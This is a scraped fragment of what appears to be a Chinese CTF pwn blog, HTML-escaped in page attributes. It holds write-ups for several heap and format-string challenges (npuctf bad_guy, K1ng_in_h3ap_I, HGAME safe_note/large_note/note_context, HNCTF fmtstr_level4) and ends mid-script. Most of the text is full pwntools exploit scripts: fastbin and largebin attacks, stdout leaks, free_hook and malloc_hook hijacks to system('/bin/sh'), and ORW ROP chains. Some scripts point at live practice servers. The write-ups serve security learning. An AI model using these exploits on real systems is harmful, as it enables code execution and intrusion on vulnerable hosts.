此时修改&lt;code&gt;_IO_2_1_write_base&lt;/code&gt;和&lt;code&gt;_flags&lt;/code&gt;，&lt;code&gt;_flags&lt;/code&gt;修改为&lt;code&gt;0xfbad1887&lt;/code&gt;即可绕过所有检查，&lt;code&gt;_IO_2_1_write_base&lt;/code&gt;低位覆盖为&lt;code&gt;\x00&lt;/code&gt;即可，保证&lt;code&gt;_IO_2_1_write_base&lt;/code&gt;小于&lt;code&gt;_IO_2_1_write_ptr&lt;/code&gt;&lt;br&gt;
之后任意执行一次&lt;code&gt;puts&lt;/code&gt;函数即可泄露libc基址&lt;br&gt;
最后利用泄露的libc基址，劫持利用fastbin attack劫持&lt;code&gt;malloc_hook&lt;/code&gt;打one_gadget即可&lt;br&gt;
注意此题的glibc版本为&lt;code&gt;2.23-0ubuntu11&lt;/code&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25428)
io=process(&amp;quot;./npuctf_2020_bad_guy&amp;quot;)
elf=ELF(&amp;quot;./npuctf_2020_bad_guy&amp;quot;)
libc=ELF(&amp;quot;libc-2.23.so&amp;quot;)

one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;content: &amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    
gdb.attach(io)
pause()  
    
add(0,0x10,b&amp;quot;aaa&amp;quot;)
add(1,0x10,b&amp;quot;bbb&amp;quot;)
add(2,0x60,b&amp;quot;ccc&amp;quot;)
add(3,0x10,b&amp;quot;ddd&amp;quot;)

delete(2)

payload=cyclic(0x18)+p64(0x91)
edit(0,len(payload),payload)

delete(1)

add(4,0x10,b&amp;quot;bbb&amp;quot;)

payload=p64(0)*3+p64(0x71)+b&amp;quot;\xdd\x55&amp;quot;
edit(4,len(payload),payload)

add(5,0x60,b&amp;quot;eee&amp;quot;)

payload=b&amp;quot;\x00&amp;quot;*0x33+p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;

add(6,0x60,payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-192-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
shell=leak_addr+one_gadget[3]

add(7,0x60,b&amp;quot;aaa&amp;quot;)
delete(7)

payload=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23)
edit(4,len(payload),payload)

add(8,0x60,b&amp;quot;qqq&amp;quot;)
add(9,0x60,cyclic(0x13)+p64(shell))
# add(7,0x60,b&amp;quot;ooo&amp;quot;)
io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Index :&amp;quot;,b&amp;quot;7&amp;quot;)
io.sendlineafter(b&amp;quot;size: &amp;quot;,b&amp;quot;18&amp;quot;)

io.interactive()

# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;2021-长城杯_院校组k1ng_in_h3ap_i&#34;&gt;[2021 长城杯_院校组]K1ng_in_h3ap_I&lt;/h3&gt;
&lt;p&gt;利用泄露的printf的基址推算处stdout-0x43处地址，修改fastbin fd低3字节打fastbin attack&lt;br&gt;
然后利用&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;泄露libc&lt;br&gt;
最后realloc调栈打one_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28714)
# io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(n,s):
    io.sendlineafter(&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,&amp;quot;1&amp;quot;)
    io.sendlineafter(&amp;quot;index:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;index:\n&amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;index:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;context:\n&amp;quot;,cc)
    
def mg():
    io.sendlineafter(&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,&amp;quot;666&amp;quot;)

# gdb.attach(io)
# pause()

mg()
io.recvuntil(b&amp;quot;0x&amp;quot;)
low_bytes=int(io.recv(6),16)
print(&amp;quot;low bytes: &amp;quot;+hex(low_bytes))
stdout=low_bytes+0x36fe10
print(&amp;quot;stdout: &amp;quot;+hex(stdout))

add(0,0x60)
add(1,0x90)
add(2,0x60)
add(3,0x60)

delete(1)
add(4,0x60)
edit(4,p64(stdout-0x43)[:3])
delete(0)
delete(2)
edit(2,b&amp;quot;\x70&amp;quot;)

add(5,0x60)
add(6,0x60)
add(7,0x60)

payload=b&amp;quot;\x00&amp;quot;*0x33+p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;
edit(7,payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-192-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]
print(&amp;quot;leak addr: &amp;quot;+hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=leak_addr+one_gadget[1]

add(8,0x60)
delete(3)
edit(3,p64(malloc_hook-0x23))
add(9,0x60)
add(10,0x60)
edit(10,cyclic(0xb)+p64(shell)+p64(realloc+0xc))

delete(9)
add(9,0x60)

io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">两道fastbin attack+_IO_2_1_stdout_</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/9EpvUJ1LN0/"" data-c="
          &lt;h2 id=&#34;pwn&#34;&gt;PWN：&lt;/h2&gt;
&lt;h3 id=&#34;safe_note&#34;&gt;safe_note:&lt;/h3&gt;
&lt;p&gt;2.32加入的异或加密&lt;br&gt;
&lt;code&gt;e-&amp;gt;next = PROTECT_PTR (&amp;amp;e-&amp;gt;next, tcache-&amp;gt;entries[tc_idx])&lt;/code&gt;&lt;br&gt;
PROTECT_PTR操作就是先对pos（next域的堆块地址）右移了12位，再将与原先的指针（在此版本之前fd/next储存的内容）异或得到的结果存入next。&lt;br&gt;
当fastbin或tcachebin只有1个chunk时，next的值为0，此时&lt;code&gt;(pos&amp;gt;&amp;gt;12)^0==(pos&amp;gt;&amp;gt;12)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#define PROTECT_PTR(pos, ptr) \
((__typeof (ptr)) ((((size_t) pos) &amp;gt;&amp;gt; 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;amp;ptr, ptr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另外泄露的&lt;code&gt;main_arena+0x60&lt;/code&gt;处的地址最高位为&lt;code&gt;\x00&lt;/code&gt;需要覆盖为其他值泄露&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./vuln&amp;quot;)
# io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28133)
libc=ELF(&amp;quot;./libc-2.32.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

for i in range(8):
    add(i,0x90)
    
add(8,0x10)

for i in range(8):
    delete(i)
    
edit(7,b&amp;quot;&amp;quot;)
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]-0xa
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr:  &amp;quot;+hex(heap_addr))
      
free_hook_key=free_hook^key
edit(6,p64(free_hook_key))

# gdb.attach(io)
# pause()

add(9,0x90)
edit(9,b&amp;quot;/bin/sh&amp;quot;)
add(10,0x90)
edit(10,p64(sys_addr))

delete(9)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;large_note&#34;&gt;large_note:&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#注意0x10字节对齐
from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28607)
io=process(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.32.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
add(0,0x520)
add(1,0x600)
add(2,0x510)

delete(0)
edit(0,b&amp;quot;a&amp;quot;)
show(0)   #uaf泄露libc

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x61-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
mp_=leak_addr+0x1e3280   
tc_max_bins=mp_+0x50  #mp_.tcache_bins

edit(0,b&amp;quot;\x00&amp;quot;)
add(13,0x900)   #将chunk0分配到largebin

payload=p64(leak_addr+0x1e4030)*2+p64(tc_max_bins-0x20)*2  #注意检查，修改chunk 0的bk_nextsize为tc_max_bins - 0x20处，来达到任意地址写一个堆块地址

edit(0,payload)

delete(2) #分配chunk2 到unsortedbin

add(15,0x900) #分配一个大堆块出发largebin attack

# gdb.attach(io)
# pause()

delete(1)
payload=b&amp;quot;a&amp;quot;*0xe8+p64(free_hook) #固定偏移
edit(0,payload)

add(1,0x600) 

edit(1, p64(sys_addr))

add(6,0x600)
edit(6,b&amp;quot;/bin/sh\x00&amp;quot;)
delete(6)  #劫持free_hook为system函数，free掉&amp;quot;/bin/sh&amp;quot;堆块即可

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;note_context&#34;&gt;note_context:&lt;/h3&gt;
&lt;p&gt;largebin attack+mp_.tcache_bins+setcontext&lt;br&gt;
上一道large_note跟着官方wp走有不少疑惑，不得不吐槽一下让人云里雾里的&lt;br&gt;
这道题认真的走了一遍流程，解决了一些疑惑&lt;br&gt;
开启沙盒，禁用&lt;code&gt;execve&lt;/code&gt;和&lt;code&gt;execveat&lt;/code&gt;，打orw&lt;br&gt;
菜单题功能齐全，但是申请堆块大小范围在largebin中&lt;br&gt;
本题攻击&lt;code&gt;mp_.tcache_bins&lt;/code&gt;，largebin attack实现任意地址写&lt;br&gt;
可以申请到&lt;code&gt;mp_.tcache_bins&lt;/code&gt;处，此时可见一个堆地址覆盖了原来的0x40(tcachebin数量)&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1687500325143.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
因此之后释放的在largebin大小范围的堆块也会被tcachebin管辖&lt;br&gt;
因此可以打tcachebin posioning，可以劫持&lt;code&gt;__free_hook&lt;/code&gt;&lt;br&gt;
由于只能打orw，glibc 2.32版本下选择使用&lt;code&gt;setcontext+61&lt;/code&gt;劫持程序流&lt;br&gt;
&lt;code&gt;mov rsp,[rdx+0A0h]&lt;/code&gt;可以劫持rsp寄存器，进而达到控制程序流的目的&lt;br&gt;
而我们使用另外一个gadget：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;
mov rdx, qword ptr [rdi + 8] ;
mov qword ptr [rsp], rax ;
call qword ptr [rdx + 0x20]

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以实现调用&lt;code&gt;[rdx+0x20]&lt;/code&gt;处的指令的作用，&lt;br&gt;
调用&lt;code&gt;__free_hook&lt;/code&gt;时将传入的地址作为第一个参数传入rdi&lt;br&gt;
因此我们可以将要delete的堆块中填入&lt;code&gt;p64(0)+p64(addr)&lt;/code&gt;，将addr的值传入rdx寄存器中，最终调用&lt;code&gt;[addr+0x20]&lt;/code&gt;的指令，向该地址填入&lt;code&gt;setcontext+61&lt;/code&gt;的地址&lt;br&gt;
在当前payload的0xa0偏移处布置orw地址，可以劫持rsp寄存器到orw rop链上，不要忘了orw后跟个ret地址来弹栈执行&lt;/p&gt;
&lt;p&gt;此题需要注意申请堆块大小在largebin范围内，而&lt;code&gt;tcachebin-&amp;gt;next&lt;/code&gt;的指针异或加密在每0x1000的范围内相同（&amp;gt;&amp;gt;12正好抹去末三位），所以大于0x1000的情况很容易出现，因此可以直接用next指针异或目标地址来绕过检查&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mp_.tcache_bins&lt;/code&gt;的偏移可以直接&lt;code&gt;vmmap&lt;/code&gt;找出堆基址&lt;br&gt;
然后使用&lt;code&gt;search -8 堆基址&lt;/code&gt;&lt;br&gt;
在libc.so上的地址+0x8即是真实地址&lt;br&gt;
偏移&lt;code&gt;dist&lt;/code&gt;即可&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28878)
io=process(&amp;quot;./vuln&amp;quot;)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.32.so&amp;quot;)

#sandbox on  
def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

### leak libc
add(0,0x560) #0
add(14,0x540) #14
add(1,0x540) #1
delete(0)
edit(0,b&amp;quot;A&amp;quot;)
show(0)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-65-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))
###

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
setcontext_61=leak_addr+libc.sym[b&amp;quot;setcontext&amp;quot;]+61
mprotect=leak_addr+libc.sym[b&amp;quot;mprotect&amp;quot;]
mp_=leak_addr+0x1e32d0
open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
pop_rsi=leak_addr+0x2ac3f
pop_rdi=leak_addr+0x2858f
pop_rdx_r12=leak_addr+0x114161
pop_rax=leak_addr+0x45580
ret=leak_addr+0x26699

magic_gadget=leak_addr+0x14b760 
&#39;&#39;&#39;
mov rdx, qword ptr [rdi + 8] ;
mov qword ptr [rsp], rax ;
call qword ptr [rdx + 0x20]
&#39;&#39;&#39;

### leak heap
edit(0,b&amp;quot;\x00&amp;quot;)
add(2,0x900) #2
edit(0,b&amp;quot;A&amp;quot;*0xf+b&amp;quot;B&amp;quot;)
show(0)
io.recvuntil(b&amp;quot;B&amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x290
key=heap_addr&amp;gt;&amp;gt;12
ck_next=heap_addr+0x24d0
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))
print(&amp;quot;key: &amp;quot;,hex(key))
###


### largebin attack
payload=p64(leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+0x70)*2
payload+=p64(mp_-0x20)*2
edit(0,payload)

delete(1)
add(3,0x900) #3
###

### hijack __free_hook
add(4,0x900) #4
add(5,0x900) #5

delete(5)
delete(4)
edit(4,p64((ck_next&amp;gt;&amp;gt;12)^free_hook))
add(4,0x900)
add(5,0x900)
edit(5,p64(magic_gadget))
###
stack_addr=heap_addr+0x36f0
orw_addr=heap_addr+0x3f00


#open
orw=p64(pop_rdi)+p64(stack_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(write_a)


stack=b&amp;quot;./flag\x00\x00&amp;quot;+p64(0)*3+p64(setcontext_61)
stack=stack.ljust(0xa0,b&amp;quot;\x00&amp;quot;)
stack+=p64(orw_addr)+p64(ret)

add(6,0x800) #6
edit(6,stack)

add(7,0x800) #7
edit(7,orw)

# gdb.attach(io)
# pause()

add(8,0x700) #8
edit(8,p64(0)+p64(stack_addr))
delete(8)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">HGAME week3 复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/snl1IsNFg/"" data-c="
          &lt;p&gt;&lt;s&gt;考完数基感觉在挂科边缘&lt;/s&gt;&lt;br&gt;
做一道非栈上格式化字符串，当作加深此类题目印象&lt;br&gt;
此题使用glibc版本 2.35-0ubuntu3.1，高版本下直接ret打one_gadget限制较多&lt;br&gt;
此题采用向ret地址写入rop链来取得shell&lt;br&gt;
非栈上格式化字符串采用隔空打牛的方法，按照这样的规则找偏移即可&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1687157672853.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
此题是无限循环，可以不用考虑写入次数的问题&lt;br&gt;
但是此题自定义的函数必须保证每一次写入的字符串长度相同，否则会出现写字节不够或者超出范围写&lt;code&gt;\x01&lt;/code&gt;的问题（其实不用自定义函数就没问题了&lt;br&gt;
如下图ret地址写入出错：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1687157529064.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28950)
# io=process(&amp;quot;./fmtstr&amp;quot;)
elf=ELF(&amp;quot;./fmtstr&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

io.sendlineafter(b&amp;quot;answer: \n&amp;quot;,b&amp;quot;y&amp;quot;)

#leak libc
io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
payload=b&amp;quot;%29$p&amp;quot;
io.send(payload)
leak_addr=int(io.recv(14),16)-128-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]
print(&amp;quot;leak_addr:&amp;quot;,hex(leak_addr))

# ret=0x40101a
ret=leak_addr+0x29cd6
pop_rdi=leak_addr+0x2a3e5
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

# gdb.attach(io)
# pause()

#leak stack
io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
payload=b&amp;quot;%13$p&amp;quot;
io.send(payload)
stack_addr=int(io.recv(14),16)
print(&amp;quot;stack_addr:&amp;quot;,hex(stack_addr))
ret_addr=stack_addr-0x110
print(&amp;quot;ret_addr:&amp;quot;,hex(ret_addr))

def fmt_t(addr,ctt,off1,off2):
    io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;&amp;gt; \n&amp;quot;,&amp;quot;%{}c%{}$hn&amp;quot;.format(addr&amp;amp;0xffff,off1))
    io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;&amp;gt; \n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format(ctt&amp;amp;0xff,off2))
    
    for i in range(5):
        io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendafter(b&amp;quot;&amp;gt; \n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format((addr+i+1)&amp;amp;0xff,off1))
        io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendafter(b&amp;quot;&amp;gt; \n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format((ctt&amp;gt;&amp;gt;((i+1)*8))&amp;amp;0xff,off2))

fmt_t(ret_addr,ret,13,43)
fmt_t(ret_addr+0x8,pop_rdi,13,43)
fmt_t(ret_addr+0x10,str_sh,13,43)
fmt_t(ret_addr+0x18,sys_addr,13,43)

print(&amp;quot;ret_addr:&amp;quot;,hex(ret_addr))
print(&amp;quot;ret:&amp;quot;,hex(ret))
print(&amp;quot;pop_rdi:&amp;quot;,hex(pop_rdi))
print(&amp;quot;str_sh:&amp;quot;,hex(str_sh))
print(&amp;quot;sys_addr:&amp;quot;,hex(sys_addr))

io.sendlineafter(b&amp;quot;&amp;gt; \n&amp;quot;,b&amp;quot;2&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK4]fmtstr_level4 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/7WbYV0o_m/"" data-c="
          &lt;p&gt;投机取巧了，在nss上复现的直接猜目录了&lt;br&gt;
可以用&lt;code&gt;mprotect&lt;/code&gt;开rwx段，也可以直接orw_rop&lt;br&gt;
开启沙盒禁用常见禁用的调用，还有&lt;code&gt;openat&lt;/code&gt;，不能用&lt;code&gt;open&lt;/code&gt;库函数，syscall可以&lt;br&gt;
注意用&lt;code&gt;syscall;ret&lt;/code&gt;&lt;br&gt;
半成品exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28413)
# io=process(&amp;quot;./service&amp;quot;)
elf=ELF(&amp;quot;./service&amp;quot;)
libc=ELF(&amp;quot;libc2.so&amp;quot;)

leave_ret=0x4012c8
pop_rdi=0x401443
pop_rsi_r15=0x401441
bss_addr=0x404060+0x900 

io.sendlineafter(b&amp;quot;?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
io.recvuntil(b&amp;quot;?\n&amp;quot;)


payload=cyclic(0x38)+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(elf.got[b&amp;quot;write&amp;quot;])+p64(0)+p64(elf.plt[b&amp;quot;write&amp;quot;])+p64(0x401311)
io.send(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;write&amp;quot;]
print(&amp;quot;leak_addr:&amp;quot;,hex(leak_addr))

open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
mprotect_a=leak_addr+libc.sym[b&amp;quot;mprotect&amp;quot;]
pop_rsi=leak_addr+0x23eea
